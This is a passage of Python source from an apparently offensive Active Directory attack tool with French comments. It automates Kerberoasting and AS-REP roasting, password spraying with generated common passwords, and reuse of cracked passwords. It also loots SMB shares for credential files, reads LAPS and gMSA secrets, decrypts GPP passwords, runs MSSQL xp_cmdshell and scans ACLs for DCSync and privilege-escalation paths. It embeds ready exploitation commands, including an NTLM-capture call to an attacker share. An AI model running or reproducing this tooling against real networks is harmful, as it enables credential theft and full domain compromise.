    """Kerberoast via Guest / compte anonyme (foothold sans creds valides)."""
    if not args.domain:
        return
    nxc = nxc_bin()
    outfile = os.path.join(args.loot, "kerberoast.hashes")
    got = lambda: os.path.isfile(outfile) and os.path.getsize(outfile) > 0
    # 1) nxc ldap avec Guest
    if nxc:
        log(f"{C.GR}[i] {nxc} : Kerberoast via Guest (sans creds)...{C.X}")
        run_cmd([nxc, "ldap", dc, "-u", "guest", "-p", "", "-d", args.domain,
                 "--kerberoasting", outfile], 180)
    # 2) fallback impacket : GetUserSPNs avec Guest (mot de passe vide)
    if not got() and have("GetUserSPNs.py"):
        log(f"{C.GR}[i] GetUserSPNs via Guest (fallback impacket)...{C.X}")
        run_cmd(["GetUserSPNs.py", f"{args.domain}/guest:", "-dc-ip", dc, "-request",
                 "-outputfile", outfile], 180)
    if got():
        n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
        add_finding(state, "HIGH", f"Kerberoast via Guest : {n} ticket(s) service (sans creds)",
                    f"hashcat -m 13100 {outfile} rockyou.txt", dc)
        register_hashfile(state, "kerberoast", outfile)

def spray_reuse(args, state, dc):
    """Reutilisation de mot de passe : spray les mdp DEJA trouves sur TOUS les users."""
    nxc = nxc_bin()
    ufile = os.path.join(args.loot, "users.txt")
    sprayed = state.setdefault("_sprayed", set())
    pwds = [c["password"] for c in state.get("creds", [])
            if c.get("password") and c["password"] not in sprayed]
    if not (nxc and os.path.isfile(ufile) and pwds):
        return
    newpw = sorted(set(pwds))
    for p in newpw:
        sprayed.add(p)
    log(f"{C.GR}[i] Reutilisation de mdp : {len(newpw)} mdp connu(s) sur les users (1 passe nxc)...{C.X}")
    pfile = save_loot(args, "reuse_pw.txt", "\n".join(newpw) + "\n")
    rc, out, _ = run_cmd([nxc, "smb", dc, "-u", ufile, "-p", pfile, "--continue-on-success"]
                         + (["-d", args.domain] if args.domain else []), 1200)
    for m in re.finditer(r"\[\+\]\s*([^\\\s]+)\\([^\s:]+):(\S+)", out):
        user, pw = m.group(2), m.group(3)
        if not any(c.get("user") == user and c.get("password") == pw
                   for c in state.get("creds", [])):
            record_cred(state, user, password=pw, src="reuse")
            add_finding(state, "HIGH", f"Reutilisation de mot de passe : {user}:{pw}",
                        "meme mdp qu'un autre compte -> re-enum (boucle)", dc)

def phase_asrep(dc, args, state, label=""):
    """AS-REP roasting : comptes DONT_REQ_PREAUTH -> hash crackable."""
    if not (args.domain and os.path.isfile(os.path.join(args.loot, "users.txt"))):
        return
    outfile = os.path.join(args.loot, "asrep.hashes")
    if have("GetNPUsers.py"):
        log(f"{C.GR}[i] AS-REP roasting (GetNPUsers, {label})...{C.X}")
        rc, out, _ = run_cmd(["GetNPUsers.py", f"{args.domain}/", "-no-pass", "-dc-ip", dc,
                              "-usersfile", os.path.join(args.loot, "users.txt"),
                              "-format", "hashcat", "-outputfile", outfile], 300)
        if os.path.isfile(outfile) and os.path.getsize(outfile) > 0:
            n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
            add_finding(state, "HIGH", f"AS-REP roasting : {n} compte(s) sans pre-auth",
                        f"hashcat -m 18200 {outfile} rockyou.txt", dc)
            register_hashfile(state, "asrep", outfile)
    else:
        log(f"{C.GR}[i] GetNPUsers.py (impacket) absent -> AS-REP roast saute.{C.X}")

# ======================================================================
# PHASE 2 : ATTAQUE DE MOT DE PASSE (spray lockout-aware)
# ======================================================================
def default_passwords(args):
    import datetime
    y = datetime.date.today().year
    seasons = ["Spring", "Summer", "Autumn", "Fall", "Winter",
               "Printemps", "Ete", "Automne", "Hiver"]
    pw = []
    for s in seasons:
        pw += [f"{s}{y}", f"{s}{y}!", f"{s}{y-1}", f"{s}{y-1}!"]
    comp = (args.domain or "").split(".")[0].capitalize()
    if comp:
        pw += [f"{comp}123", f"{comp}123!", f"{comp}{y}", f"{comp}{y}!", f"{comp}{y-1}!", f"{comp}@123"]
    pw += ["Password1", "Password1!", "Password123", "Welcome1", "Welcome123!",
           "Changeme123", "P@ssw0rd", "P@ssw0rd!", "Company123!"]
    return list(dict.fromkeys(pw))

def phase2_password(hosts, args, state):
    stage("PHASE 2 - ATTAQUE DE MOT DE PASSE")
    dc = first_dc(hosts)
    nxc = nxc_bin()
    users = state.get("users") or []
    # si on a DEJA un cred (crack/loot), le spray de mdp communs est inutile + lent
    # (491 users x N mdp) -> on file direct a l'enum auth ; le VRAI spray (reutilisation
    # du mdp craque) tourne en phase 3. Sauf si --passwordlist est explicitement demande.
    if state.get("creds") and not getattr(args, "passwordlist", None):
        log(f"{C.GR}[i] {len(state['creds'])} cred(s) deja obtenue(s) -> spray par defaut saute "
            f"(le reuse-spray tournera en phase 3).{C.X}")
        return
    if not users:
        log(f"{C.Y}[i] Pas de userlist (phase 1) -> spray saute.{C.X}")
        return
    if not nxc:
        log(f"{C.Y}[i] nxc/netexec absent -> spray saute. Alternative: kerbrute passwordspray.{C.X}")
        return
    thr = state.get("lockout_threshold")
    log(f"{C.GR}[i] Lockout threshold connu : {thr}{C.X}")
    if getattr(args, "passwordlist", None) and os.path.isfile(args.passwordlist):
        with open(args.passwordlist, encoding="utf-8", errors="ignore") as f:
            passwords = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    else:
        passwords = default_passwords(args)
    # un SPRAY teste PEU de mdp (sinon = brute + lockout). Cap selon la policy + nb users.
    if thr and thr > 0:
        cap = max(1, thr - 2)
    elif len(users) > 200:
        cap = 5    # beaucoup d'users -> peu de mdp (spray = largeur, pas profondeur)
    else:
        cap = 12
    if len(passwords) > cap:
        log(f"{C.Y}[!] Spray limite a {cap} mdp (lockout={thr}) -> "
            f"--passwordlist pour forcer plus, mais attention au lockout.{C.X}")
        passwords = passwords[:cap]

    # UN SEUL appel nxc (users x passwords via fichiers) = rapide (nxc gere la matrice)
    ufile = os.path.join(args.loot, "users.txt")
    pfile = save_loot(args, "spray_pw.txt", "\n".join(passwords) + "\n")
    log(f"{C.GR}[i] Spray de {len(passwords)} mdp x {len(users)} users (1 passe nxc)...{C.X}")
    found = []
    rc, out, _ = run_cmd([nxc, "smb", dc, "-u", ufile, "-p", pfile, "--continue-on-success"]
                         + (["-d", args.domain] if args.domain else []), 1800)
    for m in re.finditer(r"\[\+\]\s*([^\\\s]+)\\([^\s:]+):(\S+)", out):
        user, pw = m.group(2), m.group(3)
        if any(c["user"] == user and c["password"] == pw for c in found):
            continue
        found.append({"user": user, "password": pw, "hash": None})
        add_finding(state, "HIGH", f"Cred valide : {user}:{pw}",
                    "reutilisable en phase 3 (enum auth)", dc)
    if found:
        state.setdefault("creds", []).extend(found)
        save_loot(args, "valid_creds.txt",
                  "\n".join(f"{c['user']}:{c['password']}" for c in found) + "\n")
        log(f"\n{C.G}{C.BD}[=] {len(found)} cred(s) valide(s) !{C.X}")
    else:
        log(f"{C.GR}[i] Aucune cred trouvee par spray.{C.X}")

# ======================================================================
# SHARES : enum authentifie + spider des fichiers sensibles
# (le classique CTF : creds en clair dans un .config / .ps1 / unattend.xml)
# ======================================================================
DEFAULT_SHARES = {"admin$", "c$", "ipc$", "print$"}
# fichiers a telecharger + fouiller (creds/config/scripts/secrets)
SENSITIVE_FILE = re.compile(
    r"(?i)(passw|cred|secret|unattend|sysprep|autologon|\.kdbx|\.ppk|id_rsa|\.pem|"
    r"web\.config|app\.config|\.ps1|\.bat|\.vbs|\.ini|backup|\.bak|\.config|vnc|"
    r"\.git|\.txt|\.xml|\.yml|\.yaml|\.json|\.ovpn|\.rdp)")

def _parse_creds_from_bytes(data):
    """Extrait des couples (user, pass) d'un fichier : base64, user@dom:pass, user/pass, cpassword."""
    import base64
    found = []
    texts = [data.decode("utf-8", "ignore")]
    for tok in [data.strip()] + re.split(rb"\s+", data.strip()):
        s = tok.strip()
        if 8 <= len(s) <= 2000 and len(s) % 4 == 0 and re.fullmatch(rb"[A-Za-z0-9+/=]+", s or b""):
            try:
                dec = base64.b64decode(s).decode("utf-8", "ignore")
                if dec and all(32 <= ord(c) < 127 or c in "\r\n\t" for c in dec):
                    texts.append(dec)
            except Exception:
                pass
    for t in texts:
        for m in re.finditer(r"([A-Za-z0-9._-]{1,40})@[\w.-]+:(\S{2,60})", t):          # user@domaine:pass
            found.append((m.group(1), m.group(2)))
        # user/pass (gere les guillemets et $username=..$password= des scripts PowerShell)
        for m in re.finditer(r"""(?is)user(?:name)?\s*[:=]\s*['"]?([A-Za-z0-9._\\@-]{1,40})['"]?"""
                             r""".{0,80}?pass(?:word)?\s*[:=]\s*['"]?([^'"\s]{2,60})""", t):
            found.append((m.group(1).split("\\")[-1], m.group(2)))
        for m in re.finditer(r'cpassword\s*[:=]\s*["\']?([A-Za-z0-9+/=]{16,})', t):       # GPP cpassword
            found.append(("GPP-cpassword", m.group(1)))
    return found

def loot_shares_host(args, state, host):
    """Liste les shares, walk, TELECHARGE les petits fichiers sensibles, extrait les creds (impacket)."""
    if not have_lib("impacket"):
        return
    try:
        from impacket.smbconnection import SMBConnection
        from io import BytesIO
    except Exception:
        return
    try:
        conn = SMBConnection(host, host, timeout=8)
        if args.nthash:
            lm, nt = nt_full(args.nthash).split(":")
            conn.login(args.user, "", args.domain or "", lm, nt)
        else:
            conn.login(args.user, args.password or "", args.domain or "")
        shares = conn.listShares()
    except Exception:
        return
    looted = []
    def walk(share, path="", depth=0):
        if depth > 6:
            return
        try:
            entries = conn.listPath(share, path + "*")
        except Exception:
            return
        for f in entries:
            name = f.get_longname()
            if name in (".", ".."):
                continue
            full = path + name
            if f.is_directory():
                walk(share, full + "\\", depth + 1)
            elif 0 < f.get_filesize() < 200000 and SENSITIVE_FILE.search(name):
                buf = BytesIO()
                try:
                    conn.getFile(share, full, buf.write)
                except Exception:
                    continue
                looted.append(f"\\\\{host}\\{share}\\{full}")
                creds_here = _parse_creds_from_bytes(buf.getvalue())
                board_share(state, host, share, name,
                            "cred en clair !" if creds_here else "fichier sensible")
                for user, pw in creds_here:
                    if user.lower() in ("username", "user", "administrator") and pw == "":
                        continue
                    record_cred(state, user, password=pw, src=f"share:{name}")
                    add_finding(state, "CRIT", f"Cred en clair dans {name} : {user}:{pw}",
                                f"\\\\{host}\\{share}\\{full}", host)
    for sh in shares:
        try:
            name = str(sh['shi1_netname']).rstrip("\x00")
        except Exception:
            continue
        if not name or name.lower() in DEFAULT_SHARES:
            continue
        walk(name)
    try:
        conn.logoff()
    except Exception:
        pass
    if looted:
        state.setdefault("loot_files", []).extend(looted)
        with open(os.path.join(args.loot, "sensitive_files.txt"), "a", encoding="utf-8") as fp:
            fp.write("\n".join(looted) + "\n")
        log(f"{C.G}    -> {len(looted)} fichier(s) sensible(s) recupere(s) sur {host}{C.X}")

def enum_shares(args, state, hosts):
    nxc = nxc_bin()
    ips = list(hosts.keys())
    save_loot(args, "hosts.txt", "\n".join(ips) + "\n")
    auth = nxc_auth(args) + (["-d", args.domain] if args.domain else [])

    # 1) apercu des permissions (READ/WRITE) via nxc si present
    if nxc:
        tf = os.path.join(args.loot, "hosts.txt")
        log(f"{C.GR}[i] {nxc} ({nxc_version()}) : enum des shares sur {len(ips)} hote(s)...{C.X}")
        rc, out, _ = run_cmd([nxc, "smb", tf] + auth + ["--shares"], 300)
        writable = []
        for line in out.splitlines():
            m = re.search(r"(\d+\.\d+\.\d+\.\d+).*?\s(\S+)\s+(READ(?:,WRITE)?|WRITE)\s*", line)
            if not m:
                continue
            host, share, perm = m.group(1), m.group(2), m.group(3)
            if share.lower() in DEFAULT_SHARES:
                continue
            add_finding(state, "MED" if perm == "READ" else "HIGH",
                        f"Share accessible ({perm}) : \\\\{host}\\{share}",
                        "loote pour des creds/configs", host)
            if "WRITE" in perm:
                writable.append(f"{host}\\{share}")
        if writable:
            add_finding(state, "HIGH", f"Share(s) inscriptibles : {len(writable)}",
                        ", ".join(writable[:5]) + " (drop payload / SCF / .lnk)")

    # 2) LOOT reel : telecharge + fouille les fichiers sensibles (impacket) -> creds auto
    if have_lib("impacket"):
        log(f"{C.GR}[i] Loot des shares (download + parse creds) sur {len(ips)} hote(s)...{C.X}")
        for ip in ips:
            loot_shares_host(args, state, ip)
    elif not nxc:
        log(f"{C.Y}[i] nxc/impacket absent -> shares sautes.{C.X}")

# ======================================================================
# ENUM AVANCEE : MSSQL, LAPS, gMSA, trusts (inspire HackTricks / HTB)
# ======================================================================
def enum_mssql(args, state, hosts):
    """MSSQL : sysadmin -> xp_cmdshell RCE, liens de serveurs, vol NetNTLM."""
    mssql = [ip for ip, r in hosts.items() if 1433 in r.get("ports", [])]
    if not mssql:
        return
    nxc = nxc_bin()
    if not nxc:
        add_finding(state, "INFO", f"MSSQL sur {len(mssql)} hote(s)",
                    "mssqlclient.py domain/user:pass@host -windows-auth  (enum_links, xp_cmdshell)")
        return
    log(f"{C.GR}[i] {nxc} : enum MSSQL sur {len(mssql)} hote(s)...{C.X}")
    for host in mssql:
        rc, out, _ = run_cmd([nxc, "mssql", host] + nxc_auth(args) +
                             (["-d", args.domain] if args.domain else []), 120)
        if re.search(r"Pwn3d|sysadmin|\(admin\)", out, re.I):
            add_finding(state, "CRIT", f"MSSQL sysadmin sur {host} -> xp_cmdshell (RCE)",
                        "nxc mssql host -u.. -p.. -x whoami  (ou enable xp_cmdshell)", host)
            if _gate(args):
                run_cmd([nxc, "mssql", host] + nxc_auth(args) +
                        (["-d", args.domain] if args.domain else []) + ["-x", "whoami"], 120)
        elif "[+]" in out:
            add_finding(state, "MED", f"Acces MSSQL sur {host}",
                        "liens de serveurs (cross-forest) + vol NetNTLM (xp_dirtree \\\\attacker\\x)", host)

def read_laps(conn, base, state):
    """Lit les mots de passe LAPS lisibles (ms-Mcs-AdmPwd / msLAPS-Password)."""
    found = 0
    for attr in ("ms-Mcs-AdmPwd", "msLAPS-Password"):
        try:
            for e in ldap_search_all(conn, base, f"({attr}=*)", ["sAMAccountName", attr]):
                pw = str(getattr(e, attr, "") or "")
                host = str(getattr(e, "sAMAccountName", "") or "")
                if pw and pw != "[]":
                    found += 1
                    add_finding(state, "CRIT", f"LAPS lisible : {host} -> {pw[:45]}",
                                "mot de passe admin local en clair (ACL LAPS trop permissive)")
        except Exception:
            pass
    if found:
        log(f"{C.G}    -> {found} mot(s) de passe LAPS lisible(s) !{C.X}")

def read_gmsa(args, state, dc):
    """gMSA : lit msDS-ManagedPassword -> hash NT reutilisable."""
    nxc = nxc_bin()
    if not nxc:
        add_finding(state, "INFO", "gMSA : verifier msDS-ManagedPassword",
                    "gMSADumper.py -u user -p pass -d domain")
        return
    rc, out, _ = run_cmd([nxc, "ldap", dc] + nxc_auth(args) +
                         (["-d", args.domain] if args.domain else []) + ["--gmsa"], 120)
    # capture le pair LM:NT (ou NT seul) -> add_cred_hash garde le NT
    for m in re.finditer(r"(?:Account|Username):\s*(\S+).*?([0-9a-fA-F]{32}(?::[0-9a-fA-F]{32})?)", out):
        acc = m.group(1).rstrip("$")
        add_finding(state, "CRIT", f"gMSA password lisible : {acc}",
                    "hash NT reutilisable (pass-the-hash)")
        add_cred_hash(state, acc, m.group(2), "gMSA")

def enum_trusts(conn, base, state):
    """Trusts de domaine -> chemins cross-domaine (SID history child->parent)."""
    try:
        entries = ldap_search_all(conn, base, "(objectClass=trustedDomain)",
                                  ["trustPartner", "trustDirection", "trustAttributes"])
    except Exception:
        return
    for e in entries:
        partner = str(getattr(e, "trustPartner", "") or "")
        direction = str(getattr(e, "trustDirection", "") or "?")
        if partner:
            add_finding(state, "MED", f"Trust : {partner} (direction {direction})",
                        f"child->parent: raiseChild.py {state.get('domain')}/<user>@<dc> "
                        f"(SID history/ExtraSids) ; sinon goldenPac.py")
            state.setdefault("trusts", []).append(partner)

def enum_gpp_impacket(args, state, dc):
    """Get-GPPPassword.py (impacket) : dechiffre les cpassword de SYSVOL -> creds."""
    if not have("Get-GPPPassword.py"):
        return
    tgt, extra = impacket_creds(args)
    rc, out, _ = run_cmd(["Get-GPPPassword.py", f"{tgt}@{dc}"] + extra, 180)
    for m in re.finditer(r"[Uu]sername\s*:\s*(\S+).*?[Pp]assword\s*:\s*(\S+)", out, re.S):
        user, pw = m.group(1).split("\\")[-1], m.group(2)
        if user and pw and pw.lower() != "none":
            if not any(c.get("user") == user and c.get("password") == pw for c in state.get("creds", [])):
                record_cred(state, user, password=pw, src="GPP")
                add_finding(state, "CRIT", f"GPP cpassword dechiffre : {user}:{pw}",
                            "mot de passe en clair depuis SYSVOL (Groups.xml)", dc)

def enum_laps_impacket(args, state, dc):
    """GetLAPSPassword.py (impacket) : complement au LAPS via LDAP."""
    if not have("GetLAPSPassword.py"):
        return
    tgt, extra = impacket_creds(args)
    rc, out, _ = run_cmd(["GetLAPSPassword.py", tgt, "-dc-ip", dc] + extra, 180)
    # ligne LAPS = NOM_MACHINE$ suivi d'un mot de passe fort (evite le blabla de l'outil)
    for m in re.finditer(r"^\s*([A-Za-z0-9-]+\$)\s+(\S{10,})\s*$", out, re.M):
        host, pw = m.group(1), m.group(2)
        # un vrai mdp LAPS = melange maj/min/chiffre (pas un mot du texte de sortie)
        if re.search(r"[A-Z]", pw) and re.search(r"[a-z]", pw) and re.search(r"\d", pw):
            add_finding(state, "CRIT", f"LAPS (impacket) : {host} -> {pw[:45]}",
                        "mot de passe admin local en clair")

def enum_dmsa_badsuccessor(conn, base, state, args, dc):
    """BadSuccessor (2024/2025) : dMSA -> heritage de privileges. Detection + commande."""
    try:
        entries = ldap_search_all(
            conn, base, "(objectClass=msDS-DelegatedManagedServiceAccount)",
            ["sAMAccountName", "msDS-ManagedAccountPrecededByLink"])
    except Exception:
        return
    if entries:
        names = [str(getattr(e, "sAMAccountName", "") or "") for e in entries]
        add_finding(state, "HIGH", f"dMSA present ({len(names)}) -> verifier BadSuccessor",
                    f"badsuccessor.py {args.domain}/{args.user}@{dc} "
                    f"(dMSA: {', '.join(n for n in names if n)[:60]})", dc)
    # BadSuccessor exploite surtout la capacite a CREER un dMSA dans une OU accessible
    if have("badsuccessor.py") and args.domain and _once(state, f"badsucc:{args.domain}"):
        tgt, extra = impacket_creds(args)
        rc, out, _ = run_cmd(["badsuccessor.py", tgt, "-dc-ip", dc] + extra, 180)
        if re.search(r"vulnerable|writable|can create|abusable", out, re.I):
            add_finding(state, "CRIT", "BadSuccessor exploitable (OU inscriptible pour dMSA)",
                        "creation de dMSA -> heritage des privileges d'un compte cible", dc)

# ======================================================================
# PHASE 3 : ENUM AUTHENTIFIEE (le coeur)
# ======================================================================
def ldap_dump(conn, base, state, args):
    """Dump LDAP pur-python : users/computers/groups + classification."""
    interesting = {"kerberoastable": [], "asreproastable": [], "admincount": [],
                   "pwd_notreqd": [], "unconstrained": [], "desc_secrets": [],
                   "disabled": 0, "users": 0, "computers": []}
    # USERS (pagination complete)
    attrs = ["sAMAccountName", "userAccountControl", "servicePrincipalName",
             "adminCount", "description", "memberOf"]
    for e in ldap_search_all(conn, base, "(&(objectClass=user)(objectCategory=person))", attrs):
        interesting["users"] += 1
        sam = str(getattr(e, "sAMAccountName", "") or "")
        flags = uac_flags(getattr(e, "userAccountControl", 0))
        spn = getattr(e, "servicePrincipalName", None)
        desc = str(getattr(e, "description", "") or "")
        if "DISABLED" in flags:
            interesting["disabled"] += 1
        if spn and str(spn):
            interesting["kerberoastable"].append(sam)
        if "DONT_REQ_PREAUTH" in flags:
            interesting["asreproastable"].append(sam)
        if "PWD_NOTREQD" in flags:
            interesting["pwd_notreqd"].append(sam)
        if "TRUSTED_FOR_DELEGATION" in flags:
            interesting["unconstrained"].append(sam)
        if str(getattr(e, "adminCount", "") or "") == "1":
            interesting["admincount"].append(sam)
        if desc and re.search(r"pass|pwd|mot de passe|cred|secret", desc, re.I):
            interesting["desc_secrets"].append(f"{sam}: {desc[:80]}")
        # tableau de bord : ligne user (flags courts + description)
        short = []
        if spn and str(spn): short.append("SPN")
        if "DONT_REQ_PREAUTH" in flags: short.append("AS-REP")
        if str(getattr(e, "adminCount", "") or "") == "1": short.append("adminCount")
        if "PWD_NOTREQD" in flags: short.append("PWD_NOTREQD")
        if "TRUSTED_FOR_DELEGATION" in flags: short.append("UNCONSTRAINED")
        if "DISABLED" in flags: short.append("disabled")
        board_user(state, sam, ",".join(short) or "-", desc)
    # COMPUTERS (pagination complete)
    for e in ldap_search_all(conn, base, "(objectClass=computer)",
                             ["sAMAccountName", "operatingSystem", "userAccountControl",
                              "msDS-AllowedToActOnBehalfOfOtherIdentity"]):
        name = str(getattr(e, "sAMAccountName", "") or "")
        os_ = str(getattr(e, "operatingSystem", "") or "")
        flags = uac_flags(getattr(e, "userAccountControl", 0))
        rbcd = getattr(e, "msDS-AllowedToActOnBehalfOfOtherIdentity", None)
        tag = []
        if "TRUSTED_FOR_DELEGATION" in flags:
            tag.append("UNCONSTRAINED")
        if rbcd and str(rbcd):
            tag.append("RBCD")
        interesting["computers"].append({"name": name, "os": os_, "deleg": tag})
    return interesting

# ----------------------------------------------------------------------
# ACL / DACL scan : mini-BloodHound autonome (GenericAll/WriteDACL/
# WriteOwner/ForceChangePassword/GenericWrite sur des objets)
# ----------------------------------------------------------------------
GENERIC_ALL = 0x10000000; GENERIC_WRITE = 0x40000000
WRITE_DACL = 0x40000; WRITE_OWNER = 0x80000; WRITE_PROP = 0x20; CTRL_ACCESS = 0x100
EXT_RIGHTS = {
    "00299570-246d-11d0-a768-00aa006e0529": "ForceChangePassword",
    "bf9679c0-0de6-11d0-a285-00aa003049e2": "Self-Membership(AddMember)",
    "00000000-0000-0000-0000-000000000000": "AllExtendedRights",
}
# droits de REPLICATION (DCSync) -> pertinents SEULEMENT sur l'objet domaine
REPL_GUIDS = {
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "GetChanges",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "GetChangesAll",
}
# WRITE_PROP sur un attribut PRECIS -> abus cible (comme BloodHound)
WRITE_ATTR_DANGEROUS = {
    "f3a64788-5306-11d1-a9c5-0000f80367c1": "Write-SPN",              # servicePrincipalName -> targeted kerberoast
    "5b47d60f-6090-40b2-9f37-2a4de88f3063": "Write-KeyCredentialLink",# msDS-KeyCredentialLink -> shadow creds
}
# RIDs de comptes/groupes privilegies -> on ignore (ils ont des droits partout, bruit)
PRIV_RIDS = {"500", "502", "512", "516", "518", "519", "521", "544", "548",
             "549", "550", "551", "553"}
PRIV_SIDS = {"S-1-5-18", "S-1-5-32-544", "S-1-5-9", "S-1-5-10", "S-1-3-0", "S-1-5-32-548"}

def _format_sid(raw):
    try:
        from ldap3.protocol.formatters.formatters import format_sid
        return format_sid(raw)
    except Exception:
        try:
            from impacket.ldap.ldaptypes import LDAP_SID
            s = LDAP_SID(); s.fromString(raw); return s.formatCanonical()
        except Exception:
            return None

def _is_priv_sid(sid):
    if not sid or sid in PRIV_SIDS:
        return True
    return sid.rsplit("-", 1)[-1] in PRIV_RIDS

def _ace_guid(a):
    try:
        if "ObjectType" in a.fields and a["ObjectType"]:
            from impacket.uuid import bin_to_string
            return bin_to_string(a["ObjectType"]).lower()
    except Exception:
        pass
    return None

def _dangerous_ace(ace, allow_inherited=False):
    """(sid_principal, [droits]) si l'ACE accorde un droit abusable, sinon None.
    Ignore les ACE HERITEES (evite l'amplification x50 du meme grant sur tous les objets)."""
    try:
        if ace["AceType"] not in (0x00, 0x05):   # ALLOWED / ALLOWED_OBJECT seulement
            return None
        if not allow_inherited and (ace["AceFlags"] & 0x10):   # INHERITED_ACE -> skip
            return None
        a = ace["Ace"]
        mask = a["Mask"]["Mask"]
        sid = a["Sid"].formatCanonical()
    except Exception:
        return None
    rights = []
    if mask & GENERIC_ALL:  rights.append("GenericAll")
    if mask & GENERIC_WRITE: rights.append("GenericWrite")
    if mask & WRITE_DACL:   rights.append("WriteDACL")
    if mask & WRITE_OWNER:  rights.append("WriteOwner")
    guid = _ace_guid(a)
    # WRITE_PROP : sur TOUTES les proprietes (pas de GUID) = GenericWrite (cle !)
    #              sur un attribut precis (SPN / KeyCredentialLink) = abus cible
    if mask & WRITE_PROP:
        if not guid:
            if "GenericWrite" not in rights:
                rights.append("GenericWrite")
        elif guid in WRITE_ATTR_DANGEROUS:
            rights.append(WRITE_ATTR_DANGEROUS[guid])
    # extended rights EXPLOITABLES (control access ; replication traitee a part)
    if guid and guid in EXT_RIGHTS and guid not in REPL_GUIDS and (mask & CTRL_ACCESS):
        rights.append(EXT_RIGHTS[guid])
    return (sid, rights) if rights else None

def _replication_ace(ace):
    """DCSync : GetChanges / GetChangesAll (ou AllExtendedRights) sur l'objet domaine."""
    try:
        if ace["AceType"] not in (0x00, 0x05):
            return None
        a = ace["Ace"]
        mask = a["Mask"]["Mask"]
        sid = a["Sid"].formatCanonical()
        if not (mask & CTRL_ACCESS):
            return None
    except Exception:
        return None
    guid = _ace_guid(a)
    if guid == "00000000-0000-0000-0000-000000000000":   # AllExtendedRights -> inclut la replication
        return (sid, "GetChangesAll")
    return (sid, REPL_GUIDS[guid]) if guid in REPL_GUIDS else None

def ldap_acl_scan(conn, base, state):
    if not have_lib("impacket"):
        log(f"{C.Y}[i] impacket absent -> parsing ACL saute (pip install impacket).{C.X}")
        return
    try:
        from ldap3.protocol.microsoft import security_descriptor_control
        from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
        from ldap3 import SUBTREE
    except Exception as e:
        log(f"{C.GR}    (ACL scan indispo : {e}){C.X}")
        return
    log(f"{C.GR}[i] Scan des ACL (nTSecurityDescriptor) -> droits abusables...{C.X}")
    # 1) map SID -> nom (pour resoudre les principals) + SID de domaine
    sid_map = {}
    try:
        for e in ldap_search_all(conn, base,
                                 "(|(objectClass=user)(objectClass=group)(objectClass=computer))",
                                 ["sAMAccountName", "objectSid"]):
            raw = getattr(e, "objectSid", None)
            if raw and raw.raw_values:
                sid = _format_sid(raw.raw_values[0])
                if sid:
                    sid_map[sid] = str(getattr(e, "sAMAccountName", "") or sid)
    except Exception:
        pass
    for sid in sid_map:
        if sid.startswith("S-1-5-21") and sid.count("-") >= 7:
            state["domain_sid"] = sid.rsplit("-", 1)[0]
            break
    ctrl = security_descriptor_control(sdflags=0x04)
    # 2a) DCSync : droits de replication sur l'objet DOMAINE -> 1 finding par principal
    try:
        from ldap3 import BASE
        conn.search(base, "(objectClass=*)", search_scope=BASE,
                    attributes=["nTSecurityDescriptor"], controls=ctrl)
        if conn.entries:
            raw = getattr(conn.entries[0], "nTSecurityDescriptor", None)
            if raw and raw.raw_values:
                sd = SR_SECURITY_DESCRIPTOR(); sd.fromString(raw.raw_values[0])
                repl = {}
                for ace in sd["Dacl"].aces:
                    r = _replication_ace(ace)
                    if r and not _is_priv_sid(r[0]):
                        repl.setdefault(r[0], set()).add(r[1])
                    # WriteDACL/GenericAll/WriteOwner sur le domaine => peut s'auto-accorder DCSync
                    dgr = _dangerous_ace(ace, allow_inherited=True)
                    if dgr and not _is_priv_sid(dgr[0]) and \
                       any(x in dgr[1] for x in ("WriteDACL", "GenericAll", "WriteOwner")):
                        pn = sid_map.get(dgr[0], dgr[0])
                        add_finding(state, "CRIT",
                                    f"{pn} -> {'/'.join(dgr[1])} sur le DOMAINE (=> DCSync possible)",
                                    f"dacledit.py -action write -rights DCSync -principal {pn} "
                                    f"-target-dn '{base}' {state.get('domain')}/{pn}:<pass>")
                for psid, rights in repl.items():
                    if "GetChangesAll" in rights:
                        pname = sid_map.get(psid, psid)
                        add_finding(state, "CRIT", f"DCSync : {pname} peut repliquer le domaine",
                                    "secretsdump.py -just-dc (dump NTDS -> krbtgt/admin)")
                        state.setdefault("bloodhound", {}).setdefault("dcsync", []).append(pname)
    except Exception:
        pass
    # 2b) ACL abusables sur users/groups (ACE EXPLICITES uniquement) -> deduplique
    abuse = {}   # (pname, right) -> set(targets)
    try:
        for e in ldap_search_all(conn, base, "(|(objectClass=user)(objectClass=group))",
                                 ["sAMAccountName", "nTSecurityDescriptor"], controls=ctrl):
            raw = getattr(e, "nTSecurityDescriptor", None)
            if not raw or not raw.raw_values:
                continue
            target = str(getattr(e, "sAMAccountName", "") or "?")
            try:
                sd = SR_SECURITY_DESCRIPTOR(); sd.fromString(raw.raw_values[0])
            except Exception:
                continue
            for ace in sd["Dacl"].aces:
                info = _dangerous_ace(ace)
                if not info:
                    continue
                psid, rights = info
                if _is_priv_sid(psid):
                    continue
                pname = sid_map.get(psid, psid)
                for right in rights:
                    abuse.setdefault((pname, right), set()).add(target)
    except Exception as e:
        log(f"{C.GR}    (scan DACL partiel : {e}){C.X}")
    # 1 finding par (principal, droit) avec le nombre d'objets (fini le spam)
    for (pname, right), targets in sorted(abuse.items(), key=lambda kv: -len(kv[1])):
        nb = len(targets)
        sev = "CRIT" if right in ("GenericAll", "WriteDACL", "WriteOwner",
                                  "ForceChangePassword", "AllExtendedRights") else "HIGH"
        sample = ", ".join(sorted(targets)[:4]) + (f" (+{nb-4})" if nb > 4 else "")
        add_finding(state, sev, f"ACL : {pname} -> {right} sur {nb} objet(s)", f"ex: {sample}")
        state.setdefault("acl_paths", []).append(
            {"from": pname, "rights": [right], "to": sorted(targets)[0], "count": nb})
    ndc = len(state.get("bloodhound", {}).get("dcsync", []))
    if not abuse and not ndc:
        log(f"{C.GR}    -> aucune ACL abusable evidente (hors comptes privilegies).{C.X}")
    else:
        log(f"{C.G}    -> {len(abuse)} droit(s) abusable(s) + {ndc} DCSync{C.X}")

def phase3_authenum(hosts, args, state):
    stage("PHASE 3 - ENUM AUTHENTIFIEE")
    dc = first_dc(hosts)
    nxc = nxc_bin()

    # LDAP dump pur-python
    if have_lib("ldap3"):
        conn = ldap_bind(args, dc)
        if conn:
            rd = ldap_rootdse(dc) or {}
            base = rd.get("defaultNamingContext")
            if base:
                log(f"{C.GR}[i] Dump LDAP ({base})...{C.X}")
